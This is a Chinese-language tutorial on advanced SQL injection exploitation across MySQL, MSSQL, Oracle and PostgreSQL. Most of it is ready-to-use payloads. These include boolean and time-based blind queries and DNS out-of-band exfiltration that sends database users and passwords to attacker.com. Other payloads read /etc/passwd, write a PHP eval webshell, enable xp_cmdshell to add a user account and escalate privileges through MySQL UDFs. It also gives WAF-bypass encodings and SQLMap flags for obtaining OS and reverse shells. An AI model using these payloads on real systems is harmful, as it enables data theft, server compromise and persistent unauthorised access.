# SQL注入深入利用

### 1.1 盲注优化技术

当注入点无直接回显时，需采用盲注技术逐步提取数据。

**布尔盲注 — 二分法优化**

传统盲注逐字符比较效率极低。二分法利用 ASCII 码的有序性，将每个字符的猜测从最多 128 次缩减至最多 7 次：

```
原理：通过比较 ASCII 值大小，每次将搜索空间减半

payload 示例（布尔条件）:
AND ASCII(SUBSTRING((SELECT user()),1,1)) > 64  -- 判断首字符是否 > 64
AND ASCII(SUBSTRING((SELECT user()),1,1)) > 96  -- 进一步缩小
AND ASCII(SUBSTRING((SELECT user()),1,1)) > 112 -- 继续二分
-- 最终定位到 'r' (ASCII 114)，即 root 的首字母
```

**时间盲注 — 延时注入**

当布尔条件无法通过页面差异判断时，利用数据库延时函数制造可观测的时间差：

| 数据库 | 延时函数 | 条件判断方式 |
|--------|----------|-------------|
| MySQL | `SLEEP(5)` | `IF(condition, SLEEP(5), 0)` |
| PostgreSQL | `pg_sleep(5)` | `CASE WHEN condition THEN pg_sleep(5) END` |
| MSSQL | `WAITFOR DELAY '0:0:5'` | `IF condition WAITFOR DELAY '0:0:5'` |
| Oracle | `DBMS_LOCK.sleep(5)` | 需要权限，可用 `DECODE` 配合重查询 |

时间盲注的关键挑战是网络抖动干扰。实践中应设置大于网络基线延迟的阈值（通常 3-5 秒），并多次取平均值以降低误判。

**DNS外带盲注（OOB）**

当布尔和时间盲注均不稳定时，可利用数据库的 DNS 查询功能将数据外带到攻击者控制的域名服务器：

```
MySQL (需 secure_file_priv 配置允许):
SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT user()), '.attacker.com\\test'))

MSSQL:
EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\test'

Oracle:
SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.attacker.com/') FROM dual
```

攻击者在 `attacker.com` 的 DNS 服务器上配置日志记录，即可通过 DNS 查询日志中的子域名获取数据库内容。

### 1.2 多数据库差异利用

不同数据库的语法差异直接影响利用方式：

```
信息获取对比:
MySQL:    SELECT version()              -- 5.7.29-log
MSSQL:    SELECT @@version              -- Microsoft SQL Server 2019
Oracle:   SELECT banner FROM v$version  -- Oracle Database 19c
PostgreSQL: SELECT version()            -- PostgreSQL 12.2

拼接函数对比:
MySQL:       CONCAT(a, b) / GROUP_CONCAT(col SEPARATOR ',')
MSSQL:       a + b / STRING_AGG(col, ',') (2017+)
Oracle:      a || b / LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)
PostgreSQL:  a || b / STRING_AGG(col, ',')

注释语法对比:
MySQL:       -- / # / /* */
MSSQL:       -- / /* */
Oracle:      -- / /* */
PostgreSQL:  -- / /* */
```

### 1.3 文件读写与命令执行

**MySQL 文件读写**

```sql
-- 读取文件（需 FILE 权限 + secure_file_priv 未设为 NULL）
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('C:/Windows/win.ini')

-- 写入 Webshell
SELECT '<?php eval($_POST["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php eval($_POST["cmd"]);?>' INTO DUMPFILE '/var/www/html/shell.php'

-- 写入条件: FILE 权限 + secure_file_priv 为空或指定路径 + web 可写目录
```

`secure_file_priv` 参数是关键限制：
- 为空字符串：允许写入任意路径
- 为某路径：只能写入该路径
- 为 NULL：禁止所有文件操作

**MSSQL xp_cmdshell**

```sql
-- 启用 xp_cmdshell（需 sa 权限）
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 执行系统命令
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user hacker P@ss123 /add'
```

若 `xp_cmdshell` 被禁用，可尝试利用 `sp_OACreate`（OLE Automation Procedures）替代。

### 1.4 WAF绕过技术

**内联注释绕过**

MySQL 支持在注释内执行语句：

```sql
UNION/**/SELECT/**/1,2,3                      -- 空注释分割
UNION/*!50000SELECT*/ 1,2,3                   -- MySQL 版本条件注释
/*!50000UNION*//*!50000SELECT*/ 1,2,3          -- 绕过关键字过滤
```

**大小写混合**

```sql
UnIoN SeLeCt 1,2,3
sElEcT @@version
```

**编码绕过**

| 编码方式 | 示例 | 适用场景 |
|----------|------|----------|
| URL编码 | `UNION` → `%55NION` | URL参数 |
| 双重URL编码 | `%2555NION` | 过WAF多次解码 |
| Hex编码 | `0x756E696F6E` | 字符串比较 |
| Unicode编码 | `%u0055NION` | IIS环境 |

**分块传输编码**

利用 HTTP/1.1 的 Transfer-Encoding: chunked 绕过基于请求体的 WAF 检测：

```
POST /inject.php HTTP/1.1
Transfer-Encoding: chunked

5
id=1
4
UNIO
3
N S
3
EL
3
ECT
1
&
0

```

### 1.5 UDF提权

用户自定义函数（UDF）是 MySQL 扩展功能的机制。攻击者在获取 MySQL root 权限后，可加载自定义动态链接库执行系统命令：

```
利用条件:
1. MySQL root 权限
2. secure_file_priv 允许写入
3. plugin 目录可写（或利用目录遍历漏洞）

利用流程:
1. 将 UDF 动态库（.so/.dll）通过 LOAD_FILE + INTO DUMPFILE 写入 plugin 目录
2. 使用 CREATE FUNCTION 创建自定义函数
3. 调用自定义函数执行系统命令

关键语句:
CREATE FUNCTION sys_eval RETURNS string SONAME 'udf.so';
SELECT sys_eval('whoami');
```

UDF 提权的核心限制在于 plugin 目录的写入权限。MySQL 5.1+ 限制了可加载路径，需写入 `lib/plugin/` 目录下。

### 1.6 SQLMap高级用法

SQLMap 自动化了大部分注入利用流程，其高级参数可应对复杂场景：

```
--os-shell          获取操作系统 Shell（通过写入 Webshell + 命令执行）
--os-pwn            获取反弹 Shell（配合 Metasploit）
--tamper            指定绕过脚本（如 tamper=space2comment,between）
--second-url        二阶注入利用（注入点与回显不在同一页面）
--dns-domain        DNS 外带盲注（需配合 DNS 服务器）
--file-read         读取目标文件
--file-write/--file-dest    上传文件到目标
--technique         指定注入技术（B/E/U/S/T/Q 对应布尔/报错/联合/堆叠/时间/内联查询）
--batch             非交互模式，使用默认参数
--level/--risk      提高检测覆盖面和风险等级（level=5 risk=3 最全面）
```

常用 tamper 脚本组合：
- `space2comment`：空格替换为内联注释
- `between`：`>` 替换为 `BETWEEN`
- `randomcase`：随机大小写
- `charunicodeencode`：Unicode 编码
- `charencode`：URL 编码

---

---

